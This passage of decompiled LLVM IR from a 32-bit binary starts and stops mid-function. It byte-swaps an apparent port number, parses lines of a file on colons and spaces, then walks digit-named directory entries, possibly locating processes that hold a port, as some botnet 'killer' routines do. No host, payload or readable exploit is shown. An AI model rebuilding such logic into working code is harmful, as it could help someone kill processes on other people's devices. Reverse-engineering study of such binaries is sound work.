  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i8, align 1
  %stack_var_-4657 = alloca i32, align 4
  %stack_var_-8753 = alloca i32, align 4
  %stack_var_-8796 = alloca i8*, align 4
  %stack_var_-561 = alloca i8, align 1
  %stack_var_-8780 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804df70 = load i32, i32* @ebp, align 4
  %v0_804df71 = load i32, i32* @edi, align 4
  %v0_804df72 = load i32, i32* @esi, align 4
  %v0_804df73 = load i32, i32* @ebx, align 4
  store i32 %v0_804df73, i32* %stack_var_-16, align 4
  %v15_804df74 = ptrtoint i32* %stack_var_-8780 to i32
  %v2_804df7a = ptrtoint i8* %stack_var_-561 to i32
  store i32 %v2_804df7a, i32* @edi, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v5_804dfbd = call i32 @function_805310a(i8* nonnull %stack_var_-561, i32 0, i32 513)
  %v1_804dfc5 = trunc i32 %arg1 to i16
  %v2_804dfc5 = call i16 @llvm.bswap.i16(i16 %v1_804dfc5)
  %v3_804dfc5 = zext i16 %v2_804dfc5 to i32
  %v2_804dfd0 = ptrtoint i32* %stack_var_-8753 to i32
  store i32 %v2_804dfd0, i32* %eax.global-to-local, align 4
  store i32 %v3_804dfc5, i32* @ebx, align 4
  %tmp71 = bitcast i32* %stack_var_-8753 to i8*
  store i8* %tmp71, i8** %stack_var_-8796, align 4
  %v5_804dfdb = call i32 @function_805310a(i8* %tmp71, i32 0, i32 4096)
  store i32 %v5_804dfdb, i32* %eax.global-to-local, align 4
  %v2_804dfea = ptrtoint i32* %stack_var_-4657 to i32
  store i32 %v2_804dfea, i32* %edx.global-to-local, align 4
  %tmp72 = bitcast i32* %stack_var_-4657 to i8*
  store i8* %tmp72, i8** %stack_var_-8796, align 4
  %v5_804dff2 = call i32 @function_805310a(i8* %tmp72, i32 0, i32 4096)
  %v2_804dffa = ptrtoint i8* %stack_var_-48 to i32
  store i32 %v2_804dffa, i32* %eax.global-to-local, align 4
  %v0_804e004 = load i32, i32* @ebx, align 4
  %v5_804e004 = inttoptr i32 %v0_804e004 to i8*
  store i8* %v5_804e004, i8** %stack_var_-8796, align 4
  %v4_804e005 = sext i32 %v0_804e004 to i64
  %v5_804e005 = call i32 @function_80529f0(i64 %v4_804e005, i32 16, i32 %v2_804dffa)
  store i32 %v5_804e005, i32* %eax.global-to-local, align 4
  store i32 %v2_804dffa, i32* %edx.global-to-local, align 4
  store i8* %stack_var_-48, i8** %stack_var_-8796, align 4
  %v3_804e013 = call i32 @function_80525e0(i8* nonnull %stack_var_-48)
  store i32 %v3_804e013, i32* %eax.global-to-local, align 4
  %v9_804e01b = icmp eq i32 %v3_804e013, 2
  br i1 %v9_804e01b, label %dec_label_pc_804e545, label %dec_label_pc_804e024

dec_label_pc_804e024:                             ; preds = %dec_label_pc_804df70, %dec_label_pc_804e545
  store i32 0, i32* @ebx, align 4
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v3_804e02b = call i32 @function_8051c90(i8 6)
  store i32 %v3_804e02b, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-8796, align 4
  %v3_804e037 = call i32 @function_8051c90(i8 7)
  store i32 %v3_804e037, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 9 to i8*), i8** %stack_var_-8796, align 4
  %v3_804e043 = call i32 @function_8051c90(i8 9)
  %v2_804e048 = load i8*, i8** %stack_var_-8796, align 4
  %v3_804e048 = ptrtoint i8* %v2_804e048 to i32
  store i32 %v3_804e048, i32* %eax.global-to-local, align 4
  store i32 16, i32* %edx.global-to-local, align 4
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80554d0.20, i32 0, i32 0), i8** %stack_var_-8796, align 4
  %v4_804e051 = call i32 @function_8052c92(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80554d0.20, i32 0, i32 0), i32 0)
  store i32 %v4_804e051, i32* @eax, align 4
  store i32 %v4_804e051, i32* @ebp, align 4
  %v10_804e05b = icmp eq i32 %v4_804e051, -1
  br i1 %v10_804e05b, label %dec_label_pc_804e4de, label %dec_label_pc_804e064.outer.preheader

dec_label_pc_804e064.outer.preheader:             ; preds = %dec_label_pc_804e024
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804e06c9095 = call i32 @function_8052800(i32 %v2_804df7a, i32 512, i32 %v4_804e051)
  store i32 %v4_804e06c9095, i32* %eax.global-to-local, align 4
  %v1_804e0749196 = icmp eq i32 %v4_804e06c9095, 0
  br i1 %v1_804e0749196, label %dec_label_pc_804e19b.loopexit, label %dec_label_pc_804e07c.lr.ph.lr.ph

dec_label_pc_804e07c.lr.ph.lr.ph:                 ; preds = %dec_label_pc_804e064.outer.preheader
  %v2_804e0a8 = add i32 %v15_804df74, 8221
  %v2_804e0d4 = add i32 %v15_804df74, 8219
  br label %dec_label_pc_804e07c.lr.ph

dec_label_pc_804e07c:                             ; preds = %dec_label_pc_804e07c.lr.ph, %dec_label_pc_804e064.backedge
  %v4_804e06c92 = phi i32 [ %v4_804e06c9098, %dec_label_pc_804e07c.lr.ph ], [ %v4_804e06c, %dec_label_pc_804e064.backedge ]
  %v3_804e07c = load i8, i8* %stack_var_-561, align 1
  %v4_804e07c = sext i8 %v3_804e07c to i32
  %v7_804e07c = and i32 %v4_804e06c92, -256
  %v8_804e07c = or i32 %v4_804e07c, %v7_804e07c
  store i32 %v8_804e07c, i32* @eax, align 4
  %v4_804e083 = icmp eq i8 %v3_804e07c, 0
  br i1 %v4_804e083, label %dec_label_pc_804e4a7, label %dec_label_pc_804e08b

dec_label_pc_804e08b:                             ; preds = %dec_label_pc_804e07c
  store i32 0, i32* %edx.global-to-local, align 4
  %v10_804e08d = icmp eq i8 %v3_804e07c, 58
  br i1 %v10_804e08d, label %dec_label_pc_804e4a7, label %dec_label_pc_804e095.preheader

dec_label_pc_804e095.preheader:                   ; preds = %dec_label_pc_804e08b
  %v1_804e096.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e095

dec_label_pc_804e095:                             ; preds = %dec_label_pc_804e095.preheader, %dec_label_pc_804e09d
  %v6_804e096 = phi i32 [ %v8_804e07c, %dec_label_pc_804e095.preheader ], [ %v8_804e096, %dec_label_pc_804e09d ]
  %v0_804e095 = phi i32 [ 0, %dec_label_pc_804e095.preheader ], [ %v1_804e095, %dec_label_pc_804e09d ]
  %v1_804e095 = add i32 %v0_804e095, 1
  store i32 %v1_804e095, i32* %edx.global-to-local, align 4
  %v2_804e096 = add i32 %v1_804e095, %v1_804e096.pre
  %v3_804e096 = inttoptr i32 %v2_804e096 to i8*
  %v4_804e096 = load i8, i8* %v3_804e096, align 1
  %v5_804e096 = zext i8 %v4_804e096 to i32
  %v7_804e096 = and i32 %v6_804e096, -256
  %v8_804e096 = or i32 %v5_804e096, %v7_804e096
  store i32 %v8_804e096, i32* @eax, align 4
  %v4_804e099 = icmp eq i8 %v4_804e096, 0
  br i1 %v4_804e099, label %dec_label_pc_804e064.backedge, label %dec_label_pc_804e09d

dec_label_pc_804e09d:                             ; preds = %dec_label_pc_804e095
  %v10_804e09d = icmp eq i8 %v4_804e096, 58
  %v1_804e09f = icmp eq i1 %v10_804e09d, false
  br i1 %v1_804e09f, label %dec_label_pc_804e095, label %dec_label_pc_804e0a1

dec_label_pc_804e0a1:                             ; preds = %dec_label_pc_804e09d, %dec_label_pc_804e4a7
  %v1_804e0bf = phi i32 [ 0, %dec_label_pc_804e4a7 ], [ %v1_804e095, %dec_label_pc_804e09d ]
  %v7_804e0a8 = phi i32 [ %v8_804e07c, %dec_label_pc_804e4a7 ], [ %v8_804e096, %dec_label_pc_804e09d ]
  %v3_804e0a1 = trunc i32 %v7_804e0a8 to i8
  %v4_804e0a1 = icmp eq i8 %v3_804e0a1, 0
  br i1 %v4_804e0a1, label %dec_label_pc_804e064.backedge, label %dec_label_pc_804e0a5

dec_label_pc_804e064.backedge:                    ; preds = %dec_label_pc_804e095, %dec_label_pc_804e0a1, %dec_label_pc_804e0d4
  %v0_804e064.be = phi i32 [ %v7_804e0a8, %dec_label_pc_804e0a1 ], [ 0, %dec_label_pc_804e0d4 ], [ %v8_804e096, %dec_label_pc_804e095 ]
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804e06c = call i32 @function_8052800(i32 %v2_804df7a, i32 512, i32 %v0_804e064.be)
  store i32 %v4_804e06c, i32* %eax.global-to-local, align 4
  %v1_804e074 = icmp eq i32 %v4_804e06c, 0
  br i1 %v1_804e074, label %dec_label_pc_804e19b.loopexit, label %dec_label_pc_804e07c

dec_label_pc_804e0a5:                             ; preds = %dec_label_pc_804e0a1
  %v1_804e0a5 = add i32 %v1_804e0bf, 2
  store i32 %v1_804e0a5, i32* @ecx, align 4
  %v3_804e0a8 = add i32 %v2_804e0a8, %v1_804e0bf
  %v4_804e0a8 = inttoptr i32 %v3_804e0a8 to i8*
  %v5_804e0a8 = load i8, i8* %v4_804e0a8, align 1
  %v6_804e0a8 = zext i8 %v5_804e0a8 to i32
  %v8_804e0a8 = and i32 %v7_804e0a8, -256
  %v9_804e0a8 = or i32 %v6_804e0a8, %v8_804e0a8
  store i32 %v9_804e0a8, i32* %eax.global-to-local, align 4
  %v4_804e0af = icmp eq i8 %v5_804e0a8, 0
  br i1 %v4_804e0af, label %dec_label_pc_804e0d4, label %dec_label_pc_804e0b7

dec_label_pc_804e0b7:                             ; preds = %dec_label_pc_804e0a5
  %v7_804e0b7 = icmp eq i8 %v5_804e0a8, 32
  br i1 %v7_804e0b7, label %dec_label_pc_804e0d4, label %dec_label_pc_804e0bf

dec_label_pc_804e0bf:                             ; preds = %dec_label_pc_804e0b7
  %v0_804e0bf = load i32, i32* @edi, align 4
  %v2_804e0bf = add i32 %v0_804e0bf, %v1_804e0bf
  store i32 %v2_804e0bf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0c2

dec_label_pc_804e0c2:                             ; preds = %dec_label_pc_804e0ca, %dec_label_pc_804e0bf
  %v5_804e0c2 = phi i32 [ %v7_804e0c2, %dec_label_pc_804e0ca ], [ %v1_804e0bf, %dec_label_pc_804e0bf ]
  %v0_804e0c5 = phi i32 [ %v1_804e0c5, %dec_label_pc_804e0ca ], [ %v2_804e0bf, %dec_label_pc_804e0bf ]
  %v1_804e0c2 = add i32 %v0_804e0c5, 3
  %v2_804e0c2 = inttoptr i32 %v1_804e0c2 to i8*
  %v3_804e0c2 = load i8, i8* %v2_804e0c2, align 1
  %v4_804e0c2 = zext i8 %v3_804e0c2 to i32
  %v6_804e0c2 = and i32 %v5_804e0c2, -256
  %v7_804e0c2 = or i32 %v4_804e0c2, %v6_804e0c2
  store i32 %v7_804e0c2, i32* %edx.global-to-local, align 4
  %v1_804e0c5 = add i32 %v0_804e0c5, 1
  store i32 %v1_804e0c5, i32* %eax.global-to-local, align 4
  %v4_804e0c6 = icmp eq i8 %v3_804e0c2, 0
  br i1 %v4_804e0c6, label %dec_label_pc_804e0cf, label %dec_label_pc_804e0ca

dec_label_pc_804e0ca:                             ; preds = %dec_label_pc_804e0c2
  %v7_804e0ca = icmp eq i8 %v3_804e0c2, 32
  %v1_804e0cd = icmp eq i1 %v7_804e0ca, false
  br i1 %v1_804e0cd, label %dec_label_pc_804e0c2, label %dec_label_pc_804e0cf

dec_label_pc_804e0cf:                             ; preds = %dec_label_pc_804e0ca, %dec_label_pc_804e0c2
  %v2_804e0cf = sub i32 %v1_804e0c5, %v0_804e0bf
  store i32 %v2_804e0cf, i32* %eax.global-to-local, align 4
  %v1_804e0d1 = add i32 %v2_804e0cf, 2
  br label %dec_label_pc_804e0d4

dec_label_pc_804e0d4:                             ; preds = %dec_label_pc_804e0a5, %dec_label_pc_804e0b7, %dec_label_pc_804e0cf
  %storemerge = phi i32 [ %v1_804e0d1, %dec_label_pc_804e0cf ], [ %v1_804e0a5, %dec_label_pc_804e0b7 ], [ %v1_804e0a5, %dec_label_pc_804e0a5 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_804e0d4 = add i32 %v2_804e0d4, %storemerge
  %v4_804e0d4 = inttoptr i32 %v3_804e0d4 to i8*
  store i8 0, i8* %v4_804e0d4, align 1
  %v0_804e0df = load i32, i32* @edi, align 4
  %v1_804e0df = load i32, i32* @ecx, align 4
  %v2_804e0df = add i32 %v1_804e0df, %v0_804e0df
  store i32 %v2_804e0df, i32* @ebx, align 4
  %v5_804e0e2 = inttoptr i32 %v2_804e0df to i8*
  store i8* %v5_804e0e2, i8** %stack_var_-8796, align 4
  %v3_804e0e3 = call i32 @function_80525e0(i8* %v5_804e0e2)
  store i32 %v3_804e0e3, i32* %eax.global-to-local, align 4
  store i32 %v2_804dffa, i32* @edx, align 4
  %v0_804e0f4 = load i32, i32* @ebx, align 4
  %v5_804e0f4 = inttoptr i32 %v0_804e0f4 to i8*
  store i8* %v5_804e0f4, i8** %stack_var_-8796, align 4
  %v5_804e0f5 = call i32 @function_80528d0(i8* %v5_804e0f4, i32 %v3_804e0e3, i32 %v2_804dffa)
  %v1_804e0fd = add i32 %v5_804e0f5, 1
  %v8_804e0fd = icmp eq i32 %v1_804e0fd, 0
  store i32 %v1_804e0fd, i32* @eax, align 4
  br i1 %v8_804e0fd, label %dec_label_pc_804e064.backedge, label %dec_label_pc_804e104

dec_label_pc_804e104:                             ; preds = %dec_label_pc_804e0d4
  %v0_804e104 = load i32, i32* @esi, align 4
  %v1_804e104 = add i32 %v0_804e104, 1
  %v0_804e107 = load i32, i32* @edi, align 4
  %v2_804e107 = add i32 %v0_804e107, %v0_804e104
  store i32 %v2_804e107, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e113.outer

dec_label_pc_804e113.outer:                       ; preds = %dec_label_pc_804e492, %dec_label_pc_804e104
  %v0_804e48830 = phi i32 [ %v1_804e488, %dec_label_pc_804e492 ], [ 0, %dec_label_pc_804e104 ]
  %v0_804e11625 = phi i32 [ %v1_804e116, %dec_label_pc_804e492 ], [ %v1_804e104, %dec_label_pc_804e104 ]
  %v5_804e11324 = phi i32 [ %v7_804e113, %dec_label_pc_804e492 ], [ %v1_804e0fd, %dec_label_pc_804e104 ]
  %v0_804e11322 = phi i32 [ %v1_804e498, %dec_label_pc_804e492 ], [ %v2_804e107, %dec_label_pc_804e104 ]
  %stack_var_-8769.1.ph = phi i8 [ %.stack_var_-8769.1, %dec_label_pc_804e492 ], [ 0, %dec_label_pc_804e104 ]
  br label %dec_label_pc_804e113

dec_label_pc_804e113:                             ; preds = %dec_label_pc_804e113.outer, %dec_label_pc_804e135
  %v0_804e488 = phi i32 [ %v0_804e48830, %dec_label_pc_804e113.outer ], [ %v0_804e136, %dec_label_pc_804e135 ]
  %v0_804e4a0 = phi i32 [ 0, %dec_label_pc_804e113.outer ], [ %storemerge4, %dec_label_pc_804e135 ]
  %v0_804e116 = phi i32 [ %v0_804e11625, %dec_label_pc_804e113.outer ], [ %v1_804e116, %dec_label_pc_804e135 ]
  %v5_804e113 = phi i32 [ %v5_804e11324, %dec_label_pc_804e113.outer ], [ %v7_804e113, %dec_label_pc_804e135 ]
  %v0_804e135 = phi i32 [ %v0_804e11322, %dec_label_pc_804e113.outer ], [ %v1_804e135, %dec_label_pc_804e135 ]
  %v1_804e113 = add i32 %v0_804e135, 2
  %v2_804e113 = inttoptr i32 %v1_804e113 to i8*
  %v3_804e113 = load i8, i8* %v2_804e113, align 1
  %v4_804e113 = zext i8 %v3_804e113 to i32
  %v6_804e113 = and i32 %v5_804e113, -256
  %v7_804e113 = or i32 %v4_804e113, %v6_804e113
  store i32 %v7_804e113, i32* @eax, align 4
  %v1_804e116 = add i32 %v0_804e116, 1
  %v4_804e117 = icmp eq i8 %v3_804e113, 0
  br i1 %v4_804e117, label %dec_label_pc_804e13b, label %dec_label_pc_804e11b

dec_label_pc_804e11b:                             ; preds = %dec_label_pc_804e113
  %v7_804e11b = icmp eq i8 %v3_804e113, 32
  br i1 %v7_804e11b, label %dec_label_pc_804e4a0, label %dec_label_pc_804e123

dec_label_pc_804e123:                             ; preds = %dec_label_pc_804e11b
  %v10_804e123 = icmp eq i8 %v3_804e113, 9
  br i1 %v10_804e123, label %dec_label_pc_804e4a0, label %dec_label_pc_804e12b

dec_label_pc_804e12b:                             ; preds = %dec_label_pc_804e123
  %v1_804e12b = trunc i32 %v0_804e4a0 to i8
  %v9_804e12b = icmp eq i8 %v1_804e12b, 1
  br i1 %v9_804e12b, label %dec_label_pc_804e488, label %dec_label_pc_804e133

dec_label_pc_804e133:                             ; preds = %dec_label_pc_804e488, %dec_label_pc_804e12b
  %v0_804e13631 = phi i32 [ %v1_804e488, %dec_label_pc_804e488 ], [ %v0_804e488, %dec_label_pc_804e12b ]
  br label %dec_label_pc_804e135

dec_label_pc_804e135:                             ; preds = %dec_label_pc_804e4a0, %dec_label_pc_804e133
  %v0_804e136 = phi i32 [ %v0_804e13631, %dec_label_pc_804e133 ], [ %v0_804e488, %dec_label_pc_804e4a0 ]
  %storemerge4 = phi i32 [ 0, %dec_label_pc_804e133 ], [ %v2_804e4a0, %dec_label_pc_804e4a0 ]
  store i32 %storemerge4, i32* @ebx, align 4
  %v1_804e135 = add i32 %v0_804e135, 1
  store i32 %v1_804e135, i32* %edx.global-to-local, align 4
  %v7_804e139 = icmp sgt i32 %v0_804e136, 6
  br i1 %v7_804e139, label %dec_label_pc_804e13b, label %dec_label_pc_804e113

dec_label_pc_804e13b:                             ; preds = %dec_label_pc_804e135, %dec_label_pc_804e113
  %v5_804e15a35 = phi i32 [ %storemerge4, %dec_label_pc_804e135 ], [ %v0_804e4a0, %dec_label_pc_804e113 ]
  store i32 %v1_804e116, i32* %edx.global-to-local, align 4
  %v4_804e13d = icmp eq i8 %stack_var_-8769.1.ph, 0
  br i1 %v4_804e13d, label %dec_label_pc_804e064.outer.backedge, label %dec_label_pc_804e148

dec_label_pc_804e064.outer.backedge:              ; preds = %dec_label_pc_804e13b, %dec_label_pc_804e168
  %v0_804e0648.be = phi i32 [ %v3_804e177, %dec_label_pc_804e168 ], [ %v7_804e113, %dec_label_pc_804e13b ]
  %stack_var_-8769.0.ph.be = phi i8 [ %stack_var_-8769.1.ph, %dec_label_pc_804e168 ], [ 0, %dec_label_pc_804e13b ]
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804e06c90 = call i32 @function_8052800(i32 %v2_804df7a, i32 512, i32 %v0_804e0648.be)
  store i32 %v4_804e06c90, i32* %eax.global-to-local, align 4
  %v1_804e07491 = icmp eq i32 %v4_804e06c90, 0
  br i1 %v1_804e07491, label %dec_label_pc_804e19b.loopexit, label %dec_label_pc_804e07c.lr.ph

dec_label_pc_804e07c.lr.ph:                       ; preds = %dec_label_pc_804e07c.lr.ph.lr.ph, %dec_label_pc_804e064.outer.backedge
  %v4_804e06c9098 = phi i32 [ %v4_804e06c9095, %dec_label_pc_804e07c.lr.ph.lr.ph ], [ %v4_804e06c90, %dec_label_pc_804e064.outer.backedge ]
  %stack_var_-8769.0.ph97 = phi i8 [ %tmp51, %dec_label_pc_804e07c.lr.ph.lr.ph ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804e064.outer.backedge ]
  br label %dec_label_pc_804e07c

dec_label_pc_804e148:                             ; preds = %dec_label_pc_804e13b
  %v3_804e148 = add i32 %v1_804e116, %v2_804e0d4
  %v4_804e148 = inttoptr i32 %v3_804e148 to i8*
  %v5_804e148 = load i8, i8* %v4_804e148, align 1
  %v6_804e148 = zext i8 %v5_804e148 to i32
  %v9_804e148 = or i32 %v6_804e148, %v6_804e113
  store i32 %v9_804e148, i32* %eax.global-to-local, align 4
  %v4_804e14f = icmp eq i8 %v5_804e148, 0
  br i1 %v4_804e14f, label %dec_label_pc_804e168, label %dec_label_pc_804e153

dec_label_pc_804e153:                             ; preds = %dec_label_pc_804e148
  %v7_804e153 = icmp eq i8 %v5_804e148, 32
  br i1 %v7_804e153, label %dec_label_pc_804e168, label %dec_label_pc_804e157

dec_label_pc_804e157:                             ; preds = %dec_label_pc_804e153
  %v2_804e157 = add i32 %v1_804e116, %v0_804e107
  store i32 %v2_804e157, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e15a

dec_label_pc_804e15a:                             ; preds = %dec_label_pc_804e163, %dec_label_pc_804e157
  %v0_804e15d = phi i32 [ %v1_804e15d, %dec_label_pc_804e163 ], [ %v1_804e116, %dec_label_pc_804e157 ]
  %v5_804e15a = phi i32 [ %v7_804e15a, %dec_label_pc_804e163 ], [ %v5_804e15a35, %dec_label_pc_804e157 ]
  %v0_804e15e = phi i32 [ %v1_804e15a, %dec_label_pc_804e163 ], [ %v2_804e157, %dec_label_pc_804e157 ]
  %v1_804e15a = add i32 %v0_804e15e, 1
  %v2_804e15a = inttoptr i32 %v1_804e15a to i8*
  %v3_804e15a = load i8, i8* %v2_804e15a, align 1
  %v1_804e15d = add i32 %v0_804e15d, 1
  store i32 %v1_804e15a, i32* %eax.global-to-local, align 4
  %v4_804e15f = icmp eq i8 %v3_804e15a, 0
  br i1 %v4_804e15f, label %dec_label_pc_804e168, label %dec_label_pc_804e163

dec_label_pc_804e163:                             ; preds = %dec_label_pc_804e15a
  %v4_804e15a = zext i8 %v3_804e15a to i32
  %v6_804e15a = and i32 %v5_804e15a, -256
  %v7_804e15a = or i32 %v4_804e15a, %v6_804e15a
  %v7_804e163 = icmp eq i8 %v3_804e15a, 32
  %v1_804e166 = icmp eq i1 %v7_804e163, false
  br i1 %v1_804e166, label %dec_label_pc_804e15a, label %dec_label_pc_804e168

dec_label_pc_804e168:                             ; preds = %dec_label_pc_804e163, %dec_label_pc_804e15a, %dec_label_pc_804e153, %dec_label_pc_804e148
  %v1_804e168 = phi i32 [ %v1_804e116, %dec_label_pc_804e153 ], [ %v1_804e116, %dec_label_pc_804e148 ], [ %v1_804e15d, %dec_label_pc_804e15a ], [ %v1_804e15d, %dec_label_pc_804e163 ]
  %v3_804e168 = add i32 %v1_804e168, %v2_804e0d4
  %v4_804e168 = inttoptr i32 %v3_804e168 to i8*
  store i8 0, i8* %v4_804e168, align 1
  %v0_804e173 = load i32, i32* @edi, align 4
  %v1_804e173 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e173 = add i32 %v1_804e173, %v0_804e173
  store i32 %v2_804e173, i32* @ebx, align 4
  %v5_804e176 = inttoptr i32 %v2_804e173 to i8*
  store i8* %v5_804e176, i8** %stack_var_-8796, align 4
  %v3_804e177 = call i32 @function_80525e0(i8* %v5_804e176)
  store i32 %v3_804e177, i32* @eax, align 4
  %v1_804e17f = add i32 %v3_804e177, -15
  %v6_804e17f = sub i32 14, %v3_804e177
  %v7_804e17f = and i32 %v6_804e17f, %v3_804e177
  %v8_804e17f = icmp slt i32 %v7_804e17f, 0
  %v9_804e17f = icmp eq i32 %v1_804e17f, 0
  %v10_804e17f = icmp slt i32 %v1_804e17f, 0
  %v3_804e182 = icmp eq i1 %v10_804e17f, %v8_804e17f
  %v4_804e182 = icmp eq i1 %v9_804e17f, false
  %v5_804e182 = and i1 %v4_804e182, %v3_804e182
  br i1 %v5_804e182, label %dec_label_pc_804e064.outer.backedge, label %dec_label_pc_804e188

dec_label_pc_804e188:                             ; preds = %dec_label_pc_804e168
  %v0_804e18a = load i32, i32* @ebx, align 4
  %v2_804e18b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e18b, i32* %eax.global-to-local, align 4
  %tmp73 = bitcast i32* %stack_var_-32 to i8*
  store i8* %tmp73, i8** %stack_var_-8796, align 4
  %v4_804e193 = call i32 @function_8052600(i8* %tmp73, i32 %v0_804e18a)
  store i32 %v4_804e193, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e19b

dec_label_pc_804e19b.loopexit:                    ; preds = %dec_label_pc_804e064.backedge, %dec_label_pc_804e064.outer.preheader, %dec_label_pc_804e064.outer.backedge
  %stack_var_-8769.0.ph.lcssa = phi i8 [ %tmp51, %dec_label_pc_804e064.outer.preheader ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804e064.outer.backedge ], [ %stack_var_-8769.0.ph97, %dec_label_pc_804e064.backedge ]
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  %.pre46 = bitcast i32* %stack_var_-32 to i8*
  br label %dec_label_pc_804e19b

dec_label_pc_804e19b:                             ; preds = %dec_label_pc_804e19b.loopexit, %dec_label_pc_804e188
  %.pre-phi = phi i8* [ %.pre46, %dec_label_pc_804e19b.loopexit ], [ %tmp73, %dec_label_pc_804e188 ]
  %v2_804e1a5.pre-phi = phi i32 [ %.pre, %dec_label_pc_804e19b.loopexit ], [ %v2_804e18b, %dec_label_pc_804e188 ]
  %stack_var_-8769.2 = phi i8 [ %stack_var_-8769.0.ph.lcssa, %dec_label_pc_804e19b.loopexit ], [ %stack_var_-8769.1.ph, %dec_label_pc_804e188 ]
  %v0_804e19e = load i32, i32* @ebp, align 4
  %v5_804e19e = inttoptr i32 %v0_804e19e to i8*
  store i8* %v5_804e19e, i8** %stack_var_-8796, align 4
  %v2_804e19f = call i32 @function_8052b81(i32 %v0_804e19e)
  %v2_804e1a4 = load i8*, i8** %stack_var_-8796, align 4
  %v3_804e1a4 = ptrtoint i8* %v2_804e1a4 to i32
  store i32 %v3_804e1a4, i32* %eax.global-to-local, align 4
  store i32 %v2_804e1a5.pre-phi, i32* %edx.global-to-local, align 4
  store i8* %.pre-phi, i8** %stack_var_-8796, align 4
  %v3_804e1ad = call i32 @function_80525e0(i8* %.pre-phi)
  store i32 %v3_804e1ad, i32* %eax.global-to-local, align 4
  %v1_804e1b5 = icmp eq i32 %v3_804e1ad, 0
  br i1 %v1_804e1b5, label %dec_label_pc_804e4b7, label %dec_label_pc_804e1bd

dec_label_pc_804e1bd:                             ; preds = %dec_label_pc_804e19b
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v4_804e1c3 = call i32 @function_8051be0(i32 6, i32* null)
  store i32 %v4_804e1c3, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v4_804e1ca = inttoptr i32 %v4_804e1c3 to i8*
  store i8* %v4_804e1ca, i8** %stack_var_-8796, align 4
  %v2_804e1cd = call i32 @function_8052f44(i32 %v4_804e1c3)
  store i32 %v2_804e1cd, i32* %eax.global-to-local, align 4
  store i32 %v2_804e1cd, i32* %stack_var_-8780, align 4
  %v1_804e1d9 = icmp eq i32 %v2_804e1cd, 0
  br i1 %v1_804e1d9, label %dec_label_pc_804e507, label %dec_label_pc_804e1e9

dec_label_pc_804e1e9:                             ; preds = %dec_label_pc_804e2a8, %dec_label_pc_804e21a, %dec_label_pc_804e20d, %dec_label_pc_804e57e, %dec_label_pc_804e1bd
  %v0_804e1e9 = phi i32 [ %v15_804df74, %dec_label_pc_804e1bd ], [ %v1_804e587, %dec_label_pc_804e57e ], [ %v1_804e1f6, %dec_label_pc_804e20d ], [ %v1_804e29e, %dec_label_pc_804e21a ], [ %v1_804e320, %dec_label_pc_804e2a8 ]
  %v2_804e1ec = inttoptr i32 %v0_804e1e9 to i32*
  %v3_804e1ec = load i32, i32* %v2_804e1ec, align 4
  store i32 %v3_804e1ec, i32* @ebx, align 4
  %v2_804e1f0 = add i32 %v0_804e1e9, -16
  %v3_804e1f0 = inttoptr i32 %v2_804e1f0 to i32*
  store i32 %v3_804e1ec, i32* %v3_804e1f0, align 4
  %v0_804e1f1 = call i32 @function_8053035()
  store i32 %v0_804e1f1, i32* @eax, align 4
  %v0_804e1f6 = load i32, i32* @esp, align 4
  %v1_804e1f6 = add i32 %v0_804e1f6, 16
  %v1_804e1f9 = icmp eq i32 %v0_804e1f1, 0
  br i1 %v1_804e1f9, label %dec_label_pc_804e4f2, label %dec_label_pc_804e201

dec_label_pc_804e201:                             ; preds = %dec_label_pc_804e1e9
  %v1_804e201 = add i32 %v0_804e1f6, 20
  %v2_804e201 = inttoptr i32 %v1_804e201 to i32*
  %v3_804e201 = load i32, i32* %v2_804e201, align 4
  %v1_804e205 = icmp eq i32 %v3_804e201, 0
  %v1_804e207 = icmp eq i1 %v1_804e205, false
  br i1 %v1_804e207, label %dec_label_pc_804e4f2, label %dec_label_pc_804e20d

dec_label_pc_804e20d:                             ; preds = %dec_label_pc_804e201
  %v1_804e20d = add i32 %v0_804e1f1, 11
  store i32 %v1_804e20d, i32* @edi, align 4
  %v2_804e210 = inttoptr i32 %v1_804e20d to i8*
  %v3_804e210 = load i8, i8* %v2_804e210, align 1
  %v4_804e210 = zext i8 %v3_804e210 to i32
  %v6_804e210 = and i32 %v0_804e1f1, -256
  %v7_804e210 = or i32 %v4_804e210, %v6_804e210
  %v1_804e213 = add i32 %v7_804e210, -48
  %v8_804e213 = trunc i32 %v1_804e213 to i8
  store i32 %v1_804e213, i32* %eax.global-to-local, align 4
  %v8_804e218 = icmp ugt i8 %v8_804e213, 9
  br i1 %v8_804e218, label %dec_label_pc_804e1e9, label %dec_label_pc_804e21a

dec_label_pc_804e21a:                             ; preds = %dec_label_pc_804e20d
  %v2_804e21a = add i32 %v0_804e1f6, 12
  %v3_804e21a = inttoptr i32 %v2_804e21a to i32*
  store i32 %v1_804e213, i32* %v3_804e21a, align 4
  %v0_804e21b = load i32, i32* %eax.global-to-local, align 4
  %v2_804e21b = add i32 %v0_804e1f6, 8
  %v3_804e21b = inttoptr i32 %v2_804e21b to i32*
  store i32 %v0_804e21b, i32* %v3_804e21b, align 4
  %v1_804e21c = add i32 %v0_804e1f6, 4
